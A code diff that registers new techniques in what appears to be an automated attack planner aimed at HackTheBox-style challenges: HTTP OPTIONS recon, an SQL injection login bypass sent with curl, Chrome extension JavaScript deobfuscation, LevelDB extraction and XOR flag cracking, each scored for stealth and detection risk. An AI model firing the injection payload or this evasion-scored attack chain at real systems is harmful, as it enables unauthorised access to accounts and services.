@@ -163,3 +163,104 @@ register(Technique(
     detection_risk=0.3,
     provides_affordances=["exploit_verified", "shell_access", "flag_captured"],
 ))
+
+# ---------------------------------------------------------------------------
+# Register HTTP POST capability techniques
+# ---------------------------------------------------------------------------
+register(Technique(
+    name="check_http_methods",
+    category="recon",
+    prerequisites=["http_service"],
+    blockers=["no_http_response"],
+    outcome="Checks HTTP methods via OPTIONS to discover POST/PUT/DELETE capability",
+    provides=["CAN_HTTP_POST", "http_post_enabled"],
+    tool="curl",
+    tool_args_template="-s -I -X OPTIONS http://{target}/",
+    timeout=15,
+    stealth_score=0.8,
+    required_capabilities=[],
+    parser="http_method_parse",
+    type="recon",
+    cost=0.3,
+    detection_risk=0.1,
+    provides_affordances=["CAN_HTTP_POST"],
+))
+
+register(Technique(
+    name="auth_bypass_post",
+    category="exploit",
+    prerequisites=["CAN_HTTP_POST", "http_service"],
+    blockers=["http_post_disabled", "AUTH_FORBIDDEN"],
+    outcome="Attempts SQLi/NoSQLi auth bypass via POST to login endpoints",
+    provides=["AUTH_BYPASS_SUCCESS", "SESSION_COOKIE_ISSUED"],
+    tool="curl",
+    tool_args_template="-s -i -X POST http://{target}/login -H 'Content-Type: application/x-www-form-urlencoded' --data \"username=admin' OR '1'='1&password=admin' OR '1'='1\"",
+    timeout=30,
+    stealth_score=0.4,
+    required_capabilities=[],
+    parser="auth_bypass_parse",
+    type="exploit",
+    cost=1.0,
+    detection_risk=0.3,
+    provides_affordances=["AUTH_BYPASS_SUCCESS", "SESSION_COOKIE_ISSUED"],
+))
+
+# ---------------------------------------------------------------------------
+# Register Chrome extension forensics chain techniques
+# ---------------------------------------------------------------------------
+register(Technique(
+    name="js_deobfuscate",
+    category="recon",
+    prerequisites=["extension_source_available"],
+    blockers=["no_js_source"],
+    outcome="Deobfuscates Chrome extension JavaScript by stripping hex array encodings",
+    provides=["JS_DEOBFUSCATED"],
+    tool="python3",
+    tool_args_template="-c \"import sys,re; d=sys.stdin.read(); print(re.sub(r'\\[(.*?)\\]', lambda m: str([bytes.fromhex(x.replace('\\\\\\\\x', '')).decode('utf-8','ignore') for x in m.group(1).replace(\\\"'\\\",\\\"\\\").split(',')]) if '\\\\\\\\x' in m.group(1) else m.group(0), d))\"",
+    timeout=30,
+    stealth_score=0.9,
+    required_capabilities=[],
+    parser="js_deobfuscate_parse",
+    type="recon",
+    cost=0.5,
+    detection_risk=0.05,
+    provides_affordances=["JS_DEOBFUSCATED"],
+))
+
+register(Technique(
+    name="leveldb_parse",
+    category="recon",
+    prerequisites=["extension_fs_accessible"],
+    blockers=["leveldb_not_found"],
+    outcome="Extracts key-value pairs from Chrome extension LevelDB local storage",
+    provides=["LEVELDB_RECORDS_EXTRACTED"],
+    tool="python3",
+    tool_args_template="-c \"import plyvel,sys; db=plyvel.DB(sys.argv[1], create_if_missing=False); print('\\n'.join([f'{k.hex()}:{v.hex()}' for k,v in db if len(v)>50])); db.close()\"",
+    timeout=30,
+    stealth_score=0.9,
+    required_capabilities=["plyvel_installed"],
+    parser="leveldb_data_parse",
+    type="recon",
+    cost=0.5,
+    detection_risk=0.05,
+    provides_affordances=["LEVELDB_RECORDS_EXTRACTED"],
+))
+
+register(Technique(
+    name="xor_crack",
+    category="exploit",
+    prerequisites=["LEVELDB_RECORDS_EXTRACTED"],
+    blockers=["xor_sweep_no_flag"],
+    outcome="Applies phase-shifted XOR decryption to LevelDB payloads to extract HTB flags",
+    provides=["FLAG_DECRYPTED"],
+    tool="python3",
+    tool_args_template="-m raphael.techniques.ad1_xor_sweep",
+    timeout=120,
+    stealth_score=0.7,
+    required_capabilities=[],
+    parser="xor_crack_parse",
+    type="exploit",
+    cost=2.0,
+    detection_risk=0.1,
+    provides_affordances=["FLAG_DECRYPTED"],
+))
